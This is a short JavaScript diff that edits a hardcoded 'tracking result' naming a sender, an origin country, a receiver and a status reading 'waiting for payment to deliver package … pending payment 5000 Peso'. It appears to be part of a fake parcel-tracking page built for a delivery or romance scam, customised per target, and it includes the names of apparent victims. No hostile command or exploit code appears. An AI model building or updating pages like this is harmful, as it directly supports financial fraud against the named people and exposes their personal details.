@@ -1,10 +1,10 @@
 function handle34919110LXVN(resultElement) {
     let result = {
-        sender: 'DAVID ',
-        country: 'NIGERIA🇳🇬',
-        receiver: 'Liliana Zulamith Fontes Tapia',
-        date: 'Sept 03, 2025',
-        location: 'On transit - waiting for payment to deliver package to home address- pending payment 3500 MXN'
+        sender: 'Arezki Ben ',
+        country: 'United Kindom 🇬🇧',
+        receiver: 'Gloria gevarra',
+        date: 'Oct 31, 2025',
+        location: 'On transit - waiting for payment to deliver package to home address- pending payment 5000 Peso'
     };
 
     // Display the result
